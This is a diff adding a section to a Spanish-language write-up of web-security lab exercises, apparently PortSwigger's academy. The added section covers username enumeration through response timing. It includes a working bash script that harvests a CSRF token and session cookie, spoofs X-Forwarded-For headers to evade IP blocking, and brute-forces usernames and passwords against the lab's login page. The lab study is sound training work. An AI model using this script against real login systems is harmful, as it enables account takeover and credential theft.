@@ -193,3 +193,67 @@ Nos logeamos e ingresamos a la seccion **My acount**.
 ![verify](img10.png)
 
 ## 3. Lab: Username enumeration via response timing
+
+```bash
+https://ac591f871e61f7ab805b171800bf006e.web-security-academy.net/login
+csrf=zus2HXTmtFPFdOSnT7JHTTuVSFIY5KAQ&username=sd&password=sd
+```
+
+Escribiendo el script, tendremos el siguiente.
+
+```bash
+#!/bin/bash
+
+URL='https://ac591f871e61f7ab805b171800bf006e.web-security-academy.net/login'
+NULL='/dev/null'
+
+REQUEST1=`curl $URL -D- -s`
+CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
+COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`
+PASS=`python -c "print 'A'*2000"`
+#USER="wieners"
+
+N=1
+
+for USER in `cat user.txt`;do
+
+	DATA='csrf='$CSRF'&username='$USER'&password='$PASS
+	RESULT=`curl $URL -d $DATA -b $COOKIE -H "X-Forwarded-For: 192.168.0.$N" -w %{time_total} -o $NULL -s`
+    TIME=`echo $RESULT | cut -d "." -f 1`
+    
+    if [[ $TIME -gt 5 ]]
+    then
+        echo "Valid user: $USER"
+        break
+    else
+        echo "Invalid user: $USER"
+    fi
+    
+	N="$[ $N + 1 ]"
+done
+
+for PASS in `cat password.txt`;do
+
+        DATA='csrf='$CSRF'&username='$USER'&password='$PASS
+        RESULT=`curl $URL -d $DATA -b $COOKIE -s -H "X-Forwarded-For: 192.168.0.$N"`
+
+        if echo $RESULT | grep -o "password" > $NULL
+        then
+                echo "Incorrect creds: $USER:$PASS"
+        else
+                echo "Valid creds: $USER:$PASS"
+                break
+        fi
+        N="$[ $N + 1 ]"
+done
+```
+
+Detectamos las credenciales con el usuario:
+
+![creds-auth3](img11.png)
+
+Validamos que las credenciales son correctas:
+
+![creds](img12.png)
+
+## 4. Lab: Broken brute-force protection, IP block
